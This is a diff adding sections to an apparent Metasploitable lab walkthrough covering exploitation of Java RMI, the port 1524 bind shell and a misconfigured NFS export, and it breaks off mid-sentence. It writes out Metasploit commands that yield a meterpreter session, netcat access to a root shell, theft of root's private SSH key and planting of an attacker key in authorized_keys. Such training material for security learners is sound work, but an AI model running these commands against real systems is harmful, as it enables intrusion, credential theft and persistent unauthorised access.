@@ -537,7 +537,7 @@ msf auxiliay(dos/rpc/rpcbomb) > run
 ![](../images/rpcbind_down_using_Dos_attack.png)
 
 ---
-## Exploiting Service on Port 139, 445: netbios-ssn Samba smbd 3.x-4.x
+## Exploiting Service on Port 139, 445: netbios-ssn ->Samba smbd 3.x-4.x
 ![](../images/service_running_on_port_139_and_445.png)
 **SMB(Server Message Block)** is a client/server protocol that is used for sharing access to files, printers, data and other resources on a network.
 
@@ -637,3 +637,100 @@ msf auxiliay(scanner/rservices/rsh_login) > run
 Here we got a root shell to the rshell services using anonymous login vulnerability.
 
 ---
+
+## Exploiting Service on Port 1099: Java-rmi ->GNU Classpath grmiregistry
+**RMI(Remote Method Invocation)** is an API that allow an object/java program to invoke another method that exist in seprate address space(i.e on remote local machine or remote server), i.e it is simply used to call a method that is present on the remote server from a local machine. Specifically, `grmiregistry` (GNU Classpath's RMI Registry) on Metasploitable provides a registry of RMI server objects on port `1099`. This registry facilitates remote clients in locating and binding to objects for method invocations, i.e provide lookup(using lookup()) for object id used to call the desired funtion. It is a namespace on which all server objects are placed.
+It has three main components->
+**1. RMI Registry**
+**2. Remote object Binding**
+**3. Serialization of objects**
+
+### Identifying Vulnerabilites or Weakness
+**1. Unauthenticated Access to Registry**: By default, RMI does not require authentication, allowing any client to connect and interact with exposed objects on the registry. This allows attackers to:
+
+- **Bind or Unbind Objects**: Attackers can register their own malicious objects in the registry.
+- **Retrieve Object References**: By querying the registry, attackers can identify and potentially exploit objects.
+**2. Deserialization Vulnerability**:
+- When RMI uses object serialization for data transfer, it deserializes incoming objects without validating their contents. If the service is configured to trust any serialized object, it becomes vulnerable to malicious objects crafted to trigger unsafe behaviors (e.g., executing arbitrary commands).
+- Through deserialization, attackers can embed malicious payloads in serialized objects, resulting in remote code execution if the server accepts these objects without validation.
+
+### Exploitation
+#### Exploiting the Unauthenticated Access to Registry Vulnerability
+Use `jrmpclient.jar` or a custom script to list the objects bound list int the RMI registry. 
+```
+java -jar jrmpclient.jar 192.168.1.103 1099
+```
+we can attempt to bind a new, malicious object in the registry if it allows unauthenticated binding. This typically requires writing Java code to register the object on the RMI server. 
+
+#### Exploiting the Deserialization Vulnerability to get a RCE
+For this we a using a metasploit module 
+```
+msconsole -q
+msf > search java_rmi
+msf > use exploit/multi/misc/java_rmi_server
+msf exploit(multi/misc/java_rmi_server) > show options
+msf exploit(multi/misc/java_rmi_server) > set RHOSTS 192.168.1.103
+msf exploit(multi/misc/java_rmi_server) > set LHOST 192.168.1.101
+msf exploit(multi/misc/java_rmi_server) > set SRVHOST 192.168.1.101
+msf exploit(multi/misc/java_rmi_server) > set SRVPORT 8080
+msf exploit(multi/misc/java_rmi_server) > run
+```
+![]()
+**Output**
+Here we got a meterpreter session, we can futher proced with post exploitation things like maintaining access...
+
+## Exploiting Service on Port 1524: bind shell ->metasploitable root shell
+On port 1524 often runs a simple Bind Shell. This is an intentional service that acts as an unsecured, open shell on the system which directy provide the remote root shell on the system. When Metasploitable was designed as a vulnerable testing environment, this service was left open and unprotected to simulate a backdoor which often left by malicious actors after a system compromise.
+
+### Identifying Vulnerabilites or Weakness
+This shell himself act like a backdoor to provide the remote root access to the target system without any authentication.
+### Exploitation
+To exploit this, We need to just simply connect to this shell using netcat, ncat or telnet and we got the remote access without any other stuff like authentication.
+**Using Netcat**
+```
+nc 192.168.1.103 1524
+```
+**Using telnet**
+```
+telnet 192.168.1.103
+```
+**Output** Here we simply got the root shell on the target and we can proced for further post exploitation things...
+
+---
+## Exploiting Service on Port 2049: nfs -> 2-4 (RPC 100003)
+NFS (Network File System) is a protocol that allows a computer to access files over a network as if they were on its local storage. NFS enables centralized file storage, making it possible for multiple clients to access, modify, and share files on a remote server.
+NFS uses the client-server model. The server exports a directory, and the client mounts it over the network. This mount point then behaves as if it were part of the local filesystem.
+
+NFS Server: Hosts the shared directories and allows access to them.
+NFS Client: Connects to the NFS server and mounts the shared directory, making it accessible as part of the local filesystem.
+### Identifying Vulnerabilites or Weakness
+**Exported Shares Enumeration and mounting an NFS share**
+On our target the NFS share are misconfigured to gave the root(/) filesystem share to every client on the local network. We can mount the root filesystem of the target and can upload or delete the file on the server.
+
+### Exploitation
+To exploit the NFS, we can mount the 
+
+```
+rpcinfo -p 192.168.1.103
+showmount -e 192.168.1.103
+service rpcbind start
+mkdir /tmp/target
+su root
+mount -t nfs 192.168.1.103:/ /tmp/target
+cd /tmp/target/
+cat /tmp/target/root/id_rsa >> /home/kali/target_private_rsa
+```
+Here we mounted the target file system on our local machine, and we can theft/upload any file on the target to get the sensitve data. Here I theft the private key of the target, with which we can access any target which trust the target.
+### Post Exploitation
+Here we can upload our ssh public key on the target to get a remote shell on the target, to get the RCE on the target
+```
+ssh-keygen -t rsa
+cat /home/kali/.ssh/id_rsa.pub >> /tmp/target/root/authorized_keys
+cat /tmp/target/root/id_rsa >> /home/kali/target_private_rsa
+umount /tmp/target
+```
+Now we can get remote shell using the private key
+```
+ssh root@192.168.1.103
+```
+Here we get the remote ssh shell on the target which can used as RCE. We can also theft the target private key to get 
